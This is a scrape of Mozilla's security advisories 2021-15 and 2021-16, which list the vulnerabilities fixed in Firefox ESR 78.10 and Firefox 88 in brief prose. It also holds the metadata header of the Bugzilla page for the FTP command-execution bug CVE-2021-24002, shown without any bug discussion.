=== Content from www.mozilla.org_756dce1e_20250114_210543.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2021-15

## Security Vulnerabilities fixed in Firefox ESR 78.10

Announced
April 19, 2021
Impact
high
Products
Firefox ESR
Fixed in

* Firefox ESR 78.10

#### [#CVE-2021-23994: Out of bound write due to lazy initialization](#CVE-2021-23994)

Reporter
Abraruddin Khan and Omair
Impact
high
##### Description

A WebGL framebuffer was not initialized early enough, resulting in memory corruption and an out of bound write.

##### References

* [Bug 1699077](https://bugzilla.mozilla.org/show_bug.cgi?id=1699077)

#### [#CVE-2021-23995: Use-after-free in Responsive Design Mode](#CVE-2021-23995)

Reporter
Irvan Kurniawan
Impact
high
##### Description

When Responsive Design Mode was enabled, it used references to objects that were previously freed. We presume that with enough effort this could have been exploited to run arbitrary code.

##### References

* [Bug 1699835](https://bugzilla.mozilla.org/show_bug.cgi?id=1699835)

#### [#CVE-2021-23998: Secure Lock icon could have been spoofed](#CVE-2021-23998)

Reporter
Jordi Chancel
Impact
moderate
##### Description

Through complicated navigations with new windows, an HTTP page could have inherited a secure lock icon from an HTTPS page.

##### References

* [Bug 1667456](https://bugzilla.mozilla.org/show_bug.cgi?id=1667456)

#### [#CVE-2021-23961: More internal network hosts could have been probed by a malicious webpage](#CVE-2021-23961)

Reporter
Samy Kamkar, Ben Seri, and Gregory Vishnepolsky
Impact
moderate
##### Description

Further techniques that built on the slipstream research combined with a malicious webpage could have exposed both an internal network's hosts as well as services running on the user's local machine.

##### References

* [Bug 1677940](https://bugzilla.mozilla.org/show_bug.cgi?id=1677940)

#### [#CVE-2021-23999: Blob URLs may have been granted additional privileges](#CVE-2021-23999)

Reporter
Nika Layzell
Impact
moderate
##### Description

If a Blob URL was loaded through some unusual user interaction, it could have been loaded by the System Principal and granted additional privileges that should not be granted to web content.

##### References

* [Bug 1691153](https://bugzilla.mozilla.org/show_bug.cgi?id=1691153)

#### [#CVE-2021-24002: Arbitrary FTP command execution on FTP servers using an encoded URL](#CVE-2021-24002)

Reporter
Daniel Santos
Impact
moderate
##### Description

When a user clicked on an FTP URL containing encoded newline characters (%0A and %0D), the newlines would have been interpreted as such and allowed arbitrary commands to be sent to the FTP server.

##### References

* [Bug 1702374](https://bugzilla.mozilla.org/show_bug.cgi?id=1702374)

#### [#CVE-2021-29945: Incorrect size computation in WebAssembly JIT could lead to null-reads](#CVE-2021-29945)

Reporter
Christian Holler
Impact
moderate
##### Description

The WebAssembly JIT could miscalculate the size of a return type, which could lead to a null read and result in a crash.

*Note: This issue only affected x86-32 platforms. Other platforms are unaffected.*

##### References

* [Bug 1700690](https://bugzilla.mozilla.org/show_bug.cgi?id=1700690)

#### [#CVE-2021-29946: Port blocking could be bypassed](#CVE-2021-29946)

Reporter
Frederik Braun
Impact
low
##### Description

Ports that were written as an integer overflow above the bounds of a 16-bit integer could have bypassed port blocking restrictions when used in the Alt-Svc header.

##### References

* [Bug 1698503](https://bugzilla.mozilla.org/show_bug.cgi?id=1698503)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from www.mozilla.org_ab358732_20250114_210543.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2021-16

## Security Vulnerabilities fixed in Firefox 88

Announced
April 19, 2021
Impact
high
Products
Firefox
Fixed in

* Firefox 88

#### [#CVE-2021-23994: Out of bound write due to lazy initialization](#CVE-2021-23994)

Reporter
Abraruddin Khan and Omair
Impact
high
##### Description

A WebGL framebuffer was not initialized early enough, resulting in memory corruption and an out of bound write.

##### References

* [Bug 1699077](https://bugzilla.mozilla.org/show_bug.cgi?id=1699077)

#### [#CVE-2021-23995: Use-after-free in Responsive Design Mode](#CVE-2021-23995)

Reporter
Irvan Kurniawan
Impact
high
##### Description

When Responsive Design Mode was enabled, it used references to objects that were previously freed. We presume that with enough effort this could have been exploited to run arbitrary code.

##### References

* [Bug 1699835](https://bugzilla.mozilla.org/show_bug.cgi?id=1699835)

#### [#CVE-2021-23996: Content rendered outside of webpage viewport](#CVE-2021-23996)

Reporter
Colin D. Munro
Impact
high
##### Description

By utilizing 3D CSS in conjunction with Javascript, content could have been rendered outside the webpage's viewport, resulting in a spoofing attack that could have been used for phishing or other attacks on a user.

##### References

* [Bug 1701834](https://bugzilla.mozilla.org/show_bug.cgi?id=1701834)

#### [#CVE-2021-23997: Use-after-free when freeing fonts from cache](#CVE-2021-23997)

Reporter
Irvan Kurniawan
Impact
high
##### Description

Due to unexpected data type conversions, a use-after-free could have occurred when interacting with the font cache. We presume that with enough effort this could have been exploited to run arbitrary code.

##### References

* [Bug 1701942](https://bugzilla.mozilla.org/show_bug.cgi?id=1701942)

#### [#CVE-2021-23998: Secure Lock icon could have been spoofed](#CVE-2021-23998)

Reporter
Jordi Chancel
Impact
moderate
##### Description

Through complicated navigations with new windows, an HTTP page could have inherited a secure lock icon from an HTTPS page.

##### References

* [Bug 1667456](https://bugzilla.mozilla.org/show_bug.cgi?id=1667456)

#### [#CVE-2021-23999: Blob URLs may have been granted additional privileges](#CVE-2021-23999)

Reporter
Nika Layzell
Impact
moderate
##### Description

If a Blob URL was loaded through some unusual user interaction, it could have been loaded by the System Principal and granted additional privileges that should not be granted to web content.

##### References

* [Bug 1691153](https://bugzilla.mozilla.org/show_bug.cgi?id=1691153)

#### [#CVE-2021-24000: requestPointerLock() could be applied to a tab different from the visible tab](#CVE-2021-24000)

Reporter
Irvan Kurniawan
Impact
moderate
##### Description

A race condition with `requestPointerLock()` and `setTimeout()` could have resulted in a user interacting with one tab when they believed they were on a separate tab. In conjunction with certain elements (such as `<input type="file">`) this could have led to an attack where a user was confused about the origin of the webpage and potentially disclosed information they did not intend to.

##### References

* [Bug 1694698](https://bugzilla.mozilla.org/show_bug.cgi?id=1694698)

#### [#CVE-2021-24001: Testing code could have enabled session history manipulations by a compromised content process](#CVE-2021-24001)

Reporter
Andrew McCreight
Impact
moderate
##### Description

A compromised content process could have performed session history manipulations it should not have been able to due to testing infrastructure that was not restricted to testing-only configurations.

##### References

* [Bug 1694727](https://bugzilla.mozilla.org/show_bug.cgi?id=1694727)

#### [#CVE-2021-24002: Arbitrary FTP command execution on FTP servers using an encoded URL](#CVE-2021-24002)

Reporter
Daniel Santos
Impact
moderate
##### Description

When a user clicked on an FTP URL containing encoded newline characters (%0A and %0D), the newlines would have been interpreted as such and allowed arbitrary commands to be sent to the FTP server.

##### References

* [Bug 1702374](https://bugzilla.mozilla.org/show_bug.cgi?id=1702374)

#### [#CVE-2021-29945: Incorrect size computation in WebAssembly JIT could lead to null-reads](#CVE-2021-29945)

Reporter
Christian Holler
Impact
moderate
##### Description

The WebAssembly JIT could miscalculate the size of a return type, which could lead to a null read and result in a crash.

*Note: This issue only affected x86-32 platforms. Other platforms are unaffected.*

##### References

* [Bug 1700690](https://bugzilla.mozilla.org/show_bug.cgi?id=1700690)

#### [#CVE-2021-29944: HTML injection vulnerability in Firefox for Android's Reader View](#CVE-2021-29944)

Reporter
Wladimir Palant working with Include Security
Impact
low
##### Description

Lack of escaping allowed HTML injection when a webpage was viewed in Reader View. While a Content Security Policy prevents direct code execution, HTML injection is still possible.
*Note: This issue only affected Firefox for Android. Other operating systems are unaffected.*

##### References

* [Bug 1697604](https://bugzilla.mozilla.org/show_bug.cgi?id=1697604)

#### [#CVE-2021-29946: Port blocking could be bypassed](#CVE-2021-29946)

Reporter
Frederik Braun
Impact
low
##### Description

Ports that were written as an integer overflow above the bounds of a 16-bit integer could have bypassed port blocking restrictions when used in the Alt-Svc header.

##### References

* [Bug 1698503](https://bugzilla.mozilla.org/show_bug.cgi?id=1698503)

#### [#CVE-2021-29947: Memory safety bugs fixed in Firefox 88](#CVE-2021-29947)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers and community members Ryan VanderMeulen, Sean Feng, Tyson Smith, Julian Seward, Christian Holler reported memory safety bugs present in Firefox 87. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 88](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1651449%2C1674142%2C1693476%2C1696886%2C1700091)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from bugzilla.mozilla.org_f5ffb6c1_20250114_210542.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1702374)
* [XML](/show_bug.cgi?ctype=xml&id=1702374)

Closed
[Bug 1702374](/show_bug.cgi?id=1702374)
(CVE-2021-24002)

Opened 4 years ago
Closed 4 years ago

# Arbitrary ftp command execution using ftp URLs

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

Arbitrary ftp command execution using ftp URLs

## Categories

### (Core Graveyard :: Networking: FTP, defect, P1)

[Product:](/describecomponents.cgi?product=Core%20Graveyard)

Core Graveyard
▾

Core Graveyard
Old, retired Core components
[See Open Bugs in This Product](/buglist.cgi?product=Core%20Graveyard&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core%20Graveyard)
Watch This Product

[Component:](/describecomponents.cgi?product=Core%20Graveyard&component=Networking%3A%20FTP#Networking%3A%20FTP)

Networking: FTP
▾

Core Graveyard :: Networking: FTP
For bugs in Mozilla's FTP code. This component deals with FTP specific issues like downloading, directory formats, problems with FTP login, or resuming partial downloads, etc.

Examples of appropriate bugs- Problems with multiple occurrences of files in directory listings, corruption in downloading certain files via FTP, etc.

[See Open Bugs in This Component](/buglist.cgi?product=Core%20Graveyard&component=Networking%3A%20FTP&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core%20Graveyard&component=Networking%3A%20FTP&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core%20Graveyard&component=Networking%3A%20FTP)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

unspecified

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

P1

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

S2

## Tracking

### (firefox-esr7888+ verified, firefox87 wontfix, firefox88+ verified, firefox89+ verified)

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

89 Branch

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Webcompat Score | --- |
| --- | --- |
| Performance Impact | --- |
| Accessibility Severity | --- |
| Webcompat Priority | --- |
| a11y-review | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr78 | [88+](/buglist.cgi?f1=cf_tracking_firefox_esr78&o1=equals&v1=88%2B) | [verified](/buglist.cgi?f1=cf_status_firefox_esr78&o1=equals&v1=verified) |
| firefox87 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox87&o1=equals&v1=wontfix) |
| firefox88 | [+](/buglist.cgi?f1=cf_tracking_firefox88&o1=equals&v1=%2B) | [verified](/buglist.cgi?f1=cf_status_firefox88&o1=equals&v1=verified) |
| firefox89 | [+](/buglist.cgi?f1=cf_tracking_firefox89&o1=equals&v1=%2B) | [verified](/buglist.cgi?f1=cf_status_firefox89&o1=equals&v1=verified) |

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr78 | 88+ | verified |
| firefox87 |  | wontfix |
| firefox88 | + | verified |
| firefox89 | + | verified |

## People

### (Reporter: danielberredo, Assigned: valentin)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=40)  [valentin](/user_profile?user_id=415378)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/29a5fcbf47b8499cdcc21098661e80d1?d=mm&size=40)  [danielberredo](/user_profile?user_id=682752)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/380d527ca6afdc48f587c6e5b8c56143?d=mm&size=40)  [edgul](/user_profile?user_id=701256)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

7 people

## References

### (Regression)

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

[kill-ftp](/show_bug.cgi?id=1574475 "RESOLVED FIXED - Remove FTP support")

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

Dependency [tree](/showdependencytree.cgi?id=1702374&hide_resolved=1)
/ [graph](/showdependencygraph.cgi?id=1702374)

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

[1536744](/show_bug.cgi?id=1536744 "RESOLVED FIXED - Make NS_NewURI work off main thread and remove nsIProtocolHandler.newURI")

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

---

## Details

### (Keywords: regression, reporter-external, sec-moderate, Whiteboard: [reporter-external] [client-bounty-form] [verif?][necko-triaged][adv-main88+] [adv-esr78.10+])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2021-24002

[Keywords:](/describekeywords.cgi)

[regression](/buglist.cgi?keywords=regression&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

